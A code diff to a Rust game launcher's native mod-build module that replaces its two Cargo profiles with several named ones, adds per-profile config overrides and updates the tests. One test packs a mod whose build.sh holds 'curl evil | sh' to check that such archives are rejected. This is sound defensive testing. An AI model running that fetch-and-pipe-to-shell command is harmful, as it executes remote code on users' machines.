@@ -34,41 +34,109 @@ pub const MIXINS_REV: &str = "ddd9700b21997c95d95ac6ee5ecafe3830cf622a";
 /// The features of the release's own game (game-build.yml).
 const FEATURES: &str = "horizon-client/mods";
 
-/// The Cargo profile a native build compiles with. `Fast` (the workspace's `[profile.fast]`: no
-/// LTO, 16 codegen units, incremental) is the default, so changing a mod recompiles only
-/// `horizon-client`'s changed parts; `Release` is the release's own (thin LTO, one codegen unit):
-/// slower to build, slightly faster game. Each has its own folder under `native/target/` and its
-/// own key, so the two never mix.
-#[derive(Clone, Copy, Debug, Default, PartialEq, Eq)]
+/// What a native build is compiled for. The player picks `Default`, the everyday build for playing
+/// with mods, quicker to rebuild than before for a somewhat slower game than `Release`'s; `Dev`, for
+/// developing a mod, the quickest to rebuild after an edit for a game about twice as slow; or
+/// `Release`, the release's own (thin LTO, one codegen unit), slowest to build. The rest are
+/// experimental, for measuring build settings, and only [`PROFILE_ENV`] or `--profile` name them.
+/// Each is a Cargo profile with its own folder under `native/target/`, and its name and settings
+/// are in the build's key, so they never mix.
+#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
+#[serde(rename_all = "kebab-case")]
 pub enum Profile {
     #[default]
-    Fast,
+    Default,
+    Dev,
     Release,
+    Performance,
+    Balanced,
+    FastRebuild,
 }
 
+/// Names a [`Profile`] for every native build, over the settings (`default`, `dev`, `release`).
+pub const PROFILE_ENV: &str = "HORIZON_LAUNCHER_NATIVE_PROFILE";
+
 impl Profile {
-    /// Cargo's name for it, and its folder in `native/target/`.
+    /// The player's choices (the Mods page, `settings native-profile`).
+    pub const ALL: [Self; 3] = [Self::Default, Self::Dev, Self::Release];
+    const EXPERIMENTAL: [Self; 3] = [Self::Performance, Self::Balanced, Self::FastRebuild];
+
     pub fn name(self) -> &'static str {
         match self {
-            Self::Fast => "fast",
+            Self::Default => "default",
+            Self::Dev => "dev",
             Self::Release => "release",
+            Self::Performance => "performance",
+            Self::Balanced => "balanced",
+            Self::FastRebuild => "fast-rebuild",
         }
     }
 
+    /// The profile named `text`, experimental ones included.
     pub fn parse(text: &str) -> Option<Self> {
-        match text.trim() {
-            "fast" => Some(Self::Fast),
-            "release" => Some(Self::Release),
-            _ => None,
-        }
+        let text = text.trim();
+        (Self::ALL.into_iter())
+            .chain(Self::EXPERIMENTAL)
+            .find(|p| p.name() == text)
     }
 
-    /// The profile `Settings::native_release` picks.
-    pub fn from_setting(release: bool) -> Self {
-        if release {
-            Self::Release
-        } else {
-            Self::Fast
+    /// The profile [`PROFILE_ENV`] names, else the settings' (`native_profile`, or the older
+    /// `native_release` switch for `Release`).
+    pub fn chosen(settings: &crate::backend::Settings) -> Self {
+        std::env::var(PROFILE_ENV)
+            .ok()
+            .and_then(|name| Self::parse(&name))
+            .or(settings.native_profile)
+            .unwrap_or(if settings.native_release {
+                Self::Release
+            } else {
+                Self::Default
+            })
+    }
+
+    /// The Cargo profile it compiles with (its folder in `native/target/`), and what it sets over
+    /// the workspace's profiles, as `cargo --config` values: here rather than in
+    /// `[profile.fast]`, which the workspace's own builds share. A mod edit recompiles the crate it
+    /// patches (any of the workspace's) and those above it. `lto = "off"` skips the thin LTO Cargo
+    /// still runs over each crate's codegen units with `fast`'s `lto = false`: a mod edit compiles faster
+    /// (how much depends on the edit), for about a fifth more tick time in a heavy scene.
+    fn cargo(self) -> (&'static str, &'static [&'static str]) {
+        match self {
+            Self::Default => (
+                "native",
+                &[
+                    "profile.native.inherits=\"fast\"",
+                    "profile.native.lto=\"off\"",
+                ],
+            ),
+            // `horizon-client` unoptimized, the crates it uses as `fast` builds them.
+            Self::Dev => (
+                "native-dev",
+                &[
+                    "profile.native-dev.inherits=\"fast\"",
+                    "profile.native-dev.package.horizon-client.opt-level=0",
+                ],
+            ),
+            Self::Release => ("release", &[]),
+            Self::Performance => ("fast", &[]),
+            Self::Balanced => (
+                "native-balanced",
+                &[
+                    "profile.native-balanced.inherits=\"fast\"",
+                    "profile.native-balanced.package.horizon-client.opt-level=2",
+                ],
+            ),
+            // The workspace's crates at opt-level 1 (`"*"` is every other package).
+            Self::FastRebuild => (
+                "native-fast-rebuild",
+                &[
+                    "profile.native-fast-rebuild.inherits=\"fast\"",
+                    "profile.native-fast-rebuild.lto=\"off\"",
+                    "profile.native-fast-rebuild.opt-level=1",
+                    "profile.native-fast-rebuild.package.\"*\".opt-level=3",
+                    "profile.native-fast-rebuild.codegen-units=64",
+                ],
+            ),
         }
     }
 }
@@ -156,7 +224,7 @@ impl Plan {
         }
     }
 
-    /// The word in "Built in 42 s (fast, incremental)".
+    /// The word in "Built in 42 s (default, incremental)".
     fn kind(&self) -> &'static str {
         match self {
             Self::UpToDate => "up to date",
@@ -232,7 +300,7 @@ fn record_key(target: Target, profile: Profile) -> String {
 /// The last build of `target` and `profile` that compiled, if the profile's folder in
 /// `native/target/` (the compiled crates both build from) is still there.
 fn last_record(target: Target, profile: Profile) -> Option<Record> {
-    if !root().join("target").join(profile.name()).is_dir() {
+    if !root().join("target").join(profile.cargo().0).is_dir() {
         return None;
     }
     read_records(&records_path()).remove(&record_key(target, profile))
@@ -723,19 +791,16 @@ fn has_mods_feature(source: &Path) -> bool {
     value.get("features").and_then(|f| f.get("mods")).is_some()
 }
 
-/// The profile the source at `source` builds with: `chosen`, except that `Fast` becomes `Release`
-/// (the release's own) for a revision whose Cargo.toml has no `[profile.fast]`.
+/// The profile the source at `source` builds with: `chosen`, except that one built on
+/// `[profile.fast]` becomes `Release` (the release's own) for a revision whose Cargo.toml has none.
 fn profile_of(source: &Path, chosen: Profile) -> Profile {
     if chosen == Profile::Release {
         return chosen;
     }
     let text = fs::read_to_string(source.join("Cargo.toml")).unwrap_or_default();
     let value: toml::Table = text.parse().unwrap_or_default();
-    match value
-        .get("profile")
-        .and_then(|p| p.get(Profile::Fast.name()))
-    {
-        Some(_) => Profile::Fast,
+    match value.get("profile").and_then(|p| p.get("fast")) {
+        Some(_) => chosen,
         None => Profile::Release,
     }
 }
@@ -862,13 +927,12 @@ pub fn version_for(
     bundles: &[Bundle],
 ) -> Result<String, String> {
     let mut hash = Sha256::new();
-    for part in [
-        mixins,
-        profile.name(),
-        target.features(),
-        rust_toolchain::VERSION,
-        revision,
-    ] {
+    let (cargo_profile, configs) = profile.cargo();
+    for part in [mixins, cargo_profile]
+        .into_iter()
+        .chain(configs.iter().copied())
+        .chain([target.features(), rust_toolchain::VERSION, revision])
+    {
         hash.update(part.as_bytes());
         hash.update([0]);
     }
@@ -1150,7 +1214,9 @@ fn compile(
     cmd.env("CARGO_TARGET_DIR", target_dir)
         .env("CARGO_TERM_PROGRESS_WHEN", "always")
         .env("CARGO_TERM_PROGRESS_WIDTH", "100");
-    cmd.args(["--locked", "--profile", profile.name()]);
+    let (cargo_profile, configs) = profile.cargo();
+    cmd.args(["--locked", "--profile", cargo_profile]);
+    cmd.args(configs.iter().flat_map(|config| ["--config", config]));
     if target == Target::Server {
         cmd.arg("--no-default-features");
     }
@@ -1213,7 +1279,8 @@ fn post_build_programs(
     progress: &impl Fn(Step),
 ) -> Result<Vec<(crates::PostBuild, PathBuf)>, String> {
     let steps = crates::post_builds(stage)?;
-    let profile = profile.name();
+    // The game's settings, so the crates it built are reused.
+    let (profile, configs) = profile.cargo();
     let _ = fs::remove_dir_all(programs);
     let mut out = Vec::new();
     for (i, step) in steps.into_iter().enumerate() {
@@ -1229,6 +1296,7 @@ fn post_build_programs(
             "--bin",
             &step.bin,
         ]);
+        cmd.args(configs.iter().flat_map(|config| ["--config", config]));
         run(
             cmd,
             &format!("Building {}'s post-build step", step.mod_id),
@@ -1493,7 +1561,7 @@ fn pipeline(
         // Out of `target_dir` before any post-build bin is built there (`post_build_programs`).
         let binary = real.join("programs").join(target.binary());
         copy_out(
-            &target_dir.join(compiled.name()).join(backend::CLIENT),
+            &target_dir.join(compiled.cargo().0).join(backend::CLIENT),
             &binary,
         )?;
         let post = post_build_programs(
@@ -1992,12 +2060,25 @@ mod tests {
         let out = installed_mods(&home).unwrap();
         let path = out.join("veinminer/mixins/veinminer/data/table.bin");
         assert_eq!(fs::read(&path).unwrap(), b"data");
-        let first =
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap();
+        let first = version_for(
+            A,
+            B,
+            Profile::Default,
+            Target::Client,
+            &bundles(&out).unwrap(),
+        )
+        .unwrap();
         fs::write(path, b"changed").unwrap();
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&out).unwrap()).unwrap()
+            version_for(
+                A,
+                B,
+                Profile::Default,
+                Target::Client,
+                &bundles(&out).unwrap()
+            )
+            .unwrap()
         );
         pack("veinminer.hnmod", Some(("build.sh", "curl evil | sh")));
         assert!(installed_mods(&home).is_err(), "only Rust and TOML sources");
@@ -2265,7 +2346,7 @@ mod tests {
             version_for(
                 revision,
                 MIXINS_REV,
-                Profile::Fast,
+                Profile::Default,
                 Target::Client,
                 &bundles(&d).unwrap(),
             )
@@ -2280,7 +2361,14 @@ mod tests {
         assert_ne!(first, key(B));
         assert_ne!(
             first,
-            version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap()
+            version_for(
+                A,
+                B,
+                Profile::Default,
+                Target::Client,
+                &bundles(&d).unwrap()
+            )
+            .unwrap()
         );
         fs::write(d.join("hook.rs"), "fn hook() { let _ = 1; }").unwrap();
         assert_ne!(first, key(A));
@@ -2296,8 +2384,16 @@ mod tests {
         backend::copy_dir(&fixture, &d).unwrap();
         let found = bundles(&d).unwrap();
         assert_eq!(found[0].id, "crate_demo");
-        let key =
-            || version_for(A, B, Profile::Fast, Target::Client, &bundles(&d).unwrap()).unwrap();
+        let key = || {
+            version_for(
+                A,
+                B,
+                Profile::Default,
+                Target::Client,
+                &bundles(&d).unwrap(),
+            )
+            .unwrap()
+        };
         let mut seen = vec![key()];
         for file in [
             "engine/src/lib.rs",
@@ -2315,16 +2411,18 @@ mod tests {
     }
 
     #[test]
-    fn the_profile_is_in_the_key_so_fast_and_release_never_mix() {
+    fn each_profile_has_its_own_key() {
         let d = dir("profile-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let fast = version_for(A, B, Profile::Fast, Target::Client, &found).unwrap();
-        let release = version_for(A, B, Profile::Release, Target::Client, &found).unwrap();
-        assert_ne!(fast, release);
+        let all = Profile::ALL.into_iter().chain(Profile::EXPERIMENTAL);
+        let keys: std::collections::BTreeSet<_> = all
+            .map(|p| version_for(A, B, p, Target::Client, &found).unwrap())
+            .collect();
+        assert_eq!(keys.len(), 6);
         assert_eq!(
-            fast,
-            version_for(A, B, Profile::Fast, Target::Client, &found).unwrap()
+            version_for(A, B, Profile::Dev, Target::Client, &found).unwrap(),
+            version_for(A, B, Profile::Dev, Target::Client, &found).unwrap()
         );
     }
 
@@ -2335,7 +2433,7 @@ mod tests {
         let d = dir("server-key");
         write_bundle(&d, "hello", "fn hook() {}");
         let found = bundles(&d).unwrap();
-        let key = |target: Target| version_for(A, B, Profile::Fast, target, &found).unwrap();
+        let key = |target: Target| version_for(A, B, Profile::Default, target, &found).unwrap();
         assert_ne!(
             key(Target::Client),
             key(Target::Server),
@@ -2356,7 +2454,7 @@ mod tests {
                 stage,
                 target,
                 Path::new("/native/target"),
-                Profile::Fast,
+                Profile::Default,
             )
             .get_args()
             .map(|a| a.to_string_lossy().into_owned())
@@ -2532,7 +2630,7 @@ mod tests {
             &folder,
             &output,
             true,
-            Profile::Fast,
+            Profile::Default,
             |_| {},
         )
         .unwrap_err();
@@ -2543,7 +2641,7 @@ mod tests {
             &folder,
             &managed,
             true,
-            Profile::Fast,
+            Profile::Default,
             |_| {},
         )
         .unwrap_err();
@@ -2561,18 +2659,19 @@ mod tests {
     }
 
     #[test]
-    fn fast_is_the_default_profile_and_the_setting_picks_release() {
-        assert_eq!(Profile::default(), Profile::Fast);
-        assert_eq!(Profile::from_setting(false), Profile::Fast);
-        assert_eq!(Profile::from_setting(true), Profile::Release);
-        assert_eq!(Profile::parse("fast"), Some(Profile::Fast));
-        assert_eq!(Profile::parse("release"), Some(Profile::Release));
+    fn the_environment_beats_the_settings_and_the_old_switch_still_picks_release() {
+        let mut settings = crate::backend::Settings::default();
+        assert_eq!(Profile::chosen(&settings), Profile::Default);
+        settings.native_release = true;
+        assert_eq!(Profile::chosen(&settings), Profile::Release);
+        settings.native_profile = Some(Profile::Dev);
+        assert_eq!(Profile::chosen(&settings), Profile::Dev);
+        assert_eq!(Profile::parse("performance"), Some(Profile::Performance));
+        assert_eq!(Profile::parse("fast-rebuild"), Some(Profile::FastRebuild));
+        assert_eq!(Profile::parse(" release "), Some(Profile::Release));
         assert_eq!(Profile::parse("debug"), None);
-        assert!(!crate::backend::Settings::default().native_release);
-        assert_eq!(
-            (Profile::Fast.name(), Profile::Release.name()),
-            ("fast", "release")
-        );
+        let text = serde_json::to_string(&settings).unwrap();
+        assert!(text.contains("\"native_profile\":\"dev\""), "{text}");
     }
 
     fn record(horizon: &str, mods: &[(&str, &str)]) -> Record {
@@ -2624,18 +2723,18 @@ mod tests {
     #[test]
     fn the_steps_name_the_profile_and_the_outcome() {
         assert_eq!(
-            Step::Plan(Plan::UpToDate, Profile::Fast).label(),
-            "Up to date (no build needed) (fast)"
+            Step::Plan(Plan::UpToDate, Profile::Default).label(),
+            "Up to date (no build needed) (default)"
         );
         let compile = Step::Compile {
             done: 12,
             total: Some(430),
             name: "serde".into(),
-            profile: Profile::Fast,
+            profile: Profile::Default,
         };
         assert_eq!(
             compile.label(),
-            "Compiling the game (fast): 12 of 430 crates, now serde"
+            "Compiling the game (default): 12 of 430 crates, now serde"
         );
         let done = |secs, profile, plan| Step::Done {
             secs,
@@ -2643,8 +2742,8 @@ mod tests {
             plan,
         };
         assert_eq!(
-            done(42, Profile::Fast, Plan::Incremental(vec![])).label(),
-            "Built in 42 s (fast, incremental)"
+            done(42, Profile::Default, Plan::Incremental(vec![])).label(),
+            "Built in 42 s (default, incremental)"
         );
         assert_eq!(
             done(125, Profile::Release, Plan::First).label(),
@@ -2787,7 +2886,7 @@ mod tests {
             &stage,
             Target::Client,
             Path::new("/native/target"),
-            Profile::Fast,
+            Profile::Default,
         );
         let args: Vec<String> = cmd
             .get_args()
@@ -2818,7 +2917,7 @@ mod tests {
             &stage,
             Target::Client,
             Path::new("/native/target"),
-            Profile::Fast,
+            Profile::Default,
         );
         let args: Vec<_> = cmd.get_args().collect();
         assert_eq!(args[1], "--config");
@@ -2826,17 +2925,17 @@ mod tests {
     }
 
     #[test]
-    fn builds_use_the_fast_profile_where_the_source_has_it() {
+    fn builds_fall_back_to_release_where_the_source_has_no_fast_profile() {
         let d = dir("profile");
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
+        assert_eq!(profile_of(&d, Profile::Default), Profile::Release);
         fs::write(d.join("Cargo.toml"), "[profile.release]\nlto = \"thin\"\n").unwrap();
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Release);
+        assert_eq!(profile_of(&d, Profile::Default), Profile::Release);
         fs::write(
             d.join("Cargo.toml"),
             "[profile.release]\nlto = \"thin\"\n[profile.fast]\ninherits = \"release\"\n",
         )
         .unwrap();
-        assert_eq!(profile_of(&d, Profile::Fast), Profile::Fast);
+        assert_eq!(profile_of(&d, Profile::Default), Profile::Default);
         assert_eq!(
             profile_of(&d, Profile::Release),
             Profile::Release,
@@ -2845,15 +2944,29 @@ mod tests {
         let rust = Toolchain {
             dir: PathBuf::from("/rust/1.99.1-x"),
         };
-        let cmd = compile(
-            &rust,
-            &d,
-            Target::Client,
-            Path::new("/native/target"),
-            Profile::Fast,
+        let args = |profile| -> Vec<String> {
+            compile(
+                &rust,
+                &d,
+                Target::Client,
+                Path::new("/native/target"),
+                profile,
+            )
+            .get_args()
+            .map(|a| a.to_string_lossy().into_owned())
+            .collect()
+        };
+        let default = args(Profile::Default);
+        assert!(default.windows(2).any(|w| w == ["--profile", "native"]));
+        assert!(default
+            .windows(2)
+            .any(|w| w == ["--config", "profile.native.lto=\"off\""]));
+        let release = args(Profile::Release);
+        assert!(release.windows(2).any(|w| w == ["--profile", "release"]));
+        assert!(
+            !release.contains(&"--config".to_string()),
+            "the release's own stays"
         );
-        let args: Vec<_> = cmd.get_args().collect();
-        assert!(args.windows(2).any(|w| w == ["--profile", "fast"]));
     }
 
     #[test]
